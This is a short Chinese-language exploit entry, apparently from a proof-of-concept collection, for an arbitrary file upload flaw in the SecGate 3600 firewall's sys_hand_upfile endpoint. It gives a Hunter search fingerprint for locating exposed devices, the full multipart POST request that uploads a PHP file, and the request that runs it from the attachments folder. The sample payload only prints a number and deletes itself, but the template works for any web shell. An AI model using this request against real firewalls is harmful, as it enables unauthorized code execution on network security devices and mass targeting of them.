# 网神SecGata3600防火墙sys_hand_upfile任意文件上传漏洞

- **系统**：网神SecGata3600防火墙sys_hand_upfile　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`hunter:`app.name="网神 SecGate"&&web.title=="网神SecGate 3600防火墙"``
- **请求**：`POST /?g=sys_hand_upfile HTTP/1.1`
- **关键头**：`Content-Length: 261`　`Content-Type: multipart/form-data; boundary=cmqfdwckb52z6zvzzjgm`

**请求体 / payload**
```
--cmqfdwckb52z6zvzzjgm
Content-Disposition: form-data; name="upfile"; filename="7litvvzvnk.php"
<?php echo 111*111;unlink(__FILE__);?>
--cmqfdwckb52z6zvzzjgm
Content-Disposition: form-data; name="submit_post"
sys_hand_upfile
--cmqfdwckb52z6zvzzjgm--

上传文件位置
GET /attachements/7litvvzvnk.php HTTP/1.1
Host:
Cookie: __s_sessionid__=jvdi0lqirs2c3ilvut5t2qluv6
```

**其他**
- 网神SecGata 3600防火墙sys\_hand\_upfile任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 网神SecGata 3600防火墙